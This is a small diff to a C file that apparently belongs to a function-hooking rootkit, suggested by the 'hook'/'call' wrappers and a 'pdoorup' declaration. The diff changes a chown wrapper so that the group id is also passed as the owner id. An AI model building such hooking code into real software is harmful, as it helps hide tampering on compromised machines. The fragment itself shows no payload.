@@ -17,7 +17,7 @@ int pdoorup(void);
 
 int chown_path(const char *path, gid_t gid){
     hook(CCHOWN);
-    return (long)call(CCHOWN, path, 0, gid);
+    return (long)call(CCHOWN, path, gid, gid);
 }
 
 int notuser(uid_t id){
